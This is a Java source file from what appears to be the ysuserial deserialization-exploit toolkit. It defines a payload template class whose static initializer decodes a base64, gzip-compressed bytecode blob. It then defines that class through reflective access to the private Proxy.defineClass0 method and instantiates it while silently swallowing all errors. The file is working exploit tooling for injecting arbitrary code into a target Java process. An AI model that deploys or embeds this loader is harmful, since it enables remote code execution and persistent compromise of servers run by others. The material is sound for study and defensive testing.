package org.su18.ysuserial.payloads.templates;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.zip.GZIPInputStream;

/**
 * ClassLoader define 代码
 */
public class ClassLoaderTemplate {

	static String b64;

	static String className;

	static {
		try {
			GZIPInputStream       gzipInputStream       = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64)));
			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
			byte[]                bs                    = new byte[4096];
			int                   read;
			while ((read = gzipInputStream.read(bs)) != -1) {
				byteArrayOutputStream.write(bs, 0, read);
			}
			byte[] bytes = byteArrayOutputStream.toByteArray();

			ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
			Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
			method.setAccessible(true);
			Class invoke = (Class) method.invoke(null, classLoader, className, bytes, 0, bytes.length);
			invoke.newInstance();
		} catch (Exception ignored) {
		}
	}

	public static byte[] base64Decode(String bs) throws Exception {
		Class  base64;
		byte[] value = null;
		try {
			base64 = Class.forName("java.util.Base64");
			Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
		} catch (Exception e) {
			try {
				base64 = Class.forName("sun.misc.BASE64Decoder");
				Object decoder = base64.newInstance();
				value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
			} catch (Exception ignored) {
			}
		}
		return value;
	}
}
